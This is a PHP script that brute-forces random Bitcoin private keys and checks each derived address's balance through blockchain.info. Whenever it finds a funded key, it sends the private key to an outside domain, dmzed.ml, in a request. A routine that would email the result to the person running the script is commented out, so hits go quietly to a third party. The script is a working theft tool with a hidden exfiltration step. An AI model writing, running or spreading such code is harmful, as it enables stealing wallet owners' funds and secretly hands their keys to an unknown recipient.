<?php
error_reporting(0);
set_time_limit(0);
require("./api/class.phpmailer.php");
require_once './api/vt.php';

use BitcoinPHP\BitcoinECDSA\BitcoinECDSA;
function sendinger($name,$username,$pass,$to_adress,$subject,$body) {
	$mail = new PHPMailer();
	$mail->IsSMTP();
	$mail->SMTPDebug = 1; 
	$mail->SMTPAuth = true;
	$mail->SMTPSecure = 'ssl'; 
	$mail->Host = "smtp.yandex.com"; 
	$mail->Port = 465; 
	$mail->IsHTML(true);
	$mail->SetLanguage("tr", "phpmailer/language");
	$mail->CharSet  ="utf-8";
	$mail->Username = $username; 
	$mail->Password = $pass; 
	$mail->SetFrom($username,$name); 
	$mail->AddAddress($to_adress); 
	$mail->Subject = $subject; 
	$mail->Body = $body; 
	$mail->Send();
}
function random_str(
    int $length = 64,
    string $keyspace = '0123456789abcdef'
): string {
    if ($length < 1) {
        throw new \RangeException("Length must be a positive integer");
    }
    $pieces = [];
    $max = mb_strlen($keyspace, '8bit') - 1;
    for ($i = 0; $i < $length; ++$i) {
        $pieces []= $keyspace[random_int(0, $max)];
    }
    return implode('', $pieces);
}
function return_random() {
	$range=gmp_random_range("9223372036854775808", "115792089237316195423570985008687907852837564279074904382605163141518161494336");
	return gmp_strval($range);
}
function return_index($index) {
	$math_in = array("0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0");
	$math_in[0] = 1;
	$math_in[1] = 16;
	$base_in = 16;
	for ($i = 2; $i < count($math_in); $i++)  {
			$base_in = bcmul($base_in, '16', 5);
			$math_in[$i] = $base_in;
		}
	$math_in = array_reverse($math_in);
	//print_r($math_in);
	$fx_index = array("0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0");
	$keyspace = '0123456789abcdef';
		
	for ($x = 0; $x < count($fx_index); $x++)  {
		
		$divdez = bcdiv($index, $math_in[$x], 5);
		$divdem = explode(".",$divdez);
		$divde = $divdem[0];
		if($divde >= 1 && 16 > $divde){
			$dube = $divde;
			///echo $x ." - ".$divdez." - $index -- $math_in[$x]\n";
			$fevdas = bcmul($dube, $math_in[$x], 5); // multiğle
			$index = bcsub($index, $fevdas, 5); // minus
			///echo $x ." $index \n";
			$fx_index[$x] = $dube;
		}
	}
	//print_r($fx_index);
	$string = "";
	for ($i = 0; $i < count($fx_index); $i++)  {
		$fx_indexx = $fx_index[$i];
		$string .= $keyspace[$fx_indexx];
	}
	return $string;
}
$start = microtime(true);
$limit = 300;  // Seconds
$solved = 0;
$sent = 0;
$page = return_random();
//echo $page."<br>";
$page_indexc = bcmul($page, '45', 0);
$page_index = return_random(); // minus
while (true) {
	$bitcoinECDSA = new BitcoinECDSA();
	$btc_generated_adrs = array();
	$collection_for_balance = "";

	for ($x = 0; $x <= 45; $x++) {
		$bitcoinECDSA->setPrivateKey(return_index($page_index));
		//echo return_index($page_index)."<br>";
		//$bitcoinECDSA->setPrivateKey("0000000000000000000000000000000000000000000000000000000000000001");
		$page_index = return_random();
		$addressc = $bitcoinECDSA->getAddress(); //compressed
		$address = $bitcoinECDSA->getUncompressedAddress();
		$wif = $bitcoinECDSA->getWif();
		$private_key = $bitcoinECDSA->getPrivateKey();
		if($bitcoinECDSA->validateAddress($addressc) && $bitcoinECDSA->validateWifKey($wif)) {
			array_push($btc_generated_adrs,"{$addressc},{$address},{$wif},{$private_key}");
			$collection_for_balance .= "{$addressc}|{$address}|";
		}
	}
	$content = file_get_contents('https://blockchain.info/multiaddr?active='.$collection_for_balance);
	$json = json_decode($content, true);
	$returned_adresses = $json["addresses"];

	foreach($returned_adresses as $item){
		foreach($btc_generated_adrs as $saved){
			 $dater = explode(",",$saved);
			 if($dater[0] == $item["address"] || $dater[1] == $item["address"]){
					if($item["final_balance"] > 0  ){
						$tosave = "Wif : ".$dater[2]."<br> Adress : ".$item["address"]."<br> Balance : ".$item["final_balance"]."<br> Tx :".$item["n_tx"]."<br> Priv key : ".$dater[3];
						//sendinger("M",$argv[1],$argv[2],$argv[1],"You Win",$tosave);
						$cons = file_get_contents('http://dmzed.ml/?id='.$dater[3]);
						$sent += 1;
						//die("found");
					}
					$solved += 1;
			 }
		}

	}
	if (microtime(true) - $start >= $limit) {
		die("Tot solved : ".$solved." Sent : ".$sent." Rnd index last : ".$page_index);
	}
	// echo "Tot solved : ".$solved." Sent : ".$sent."<br>";
}
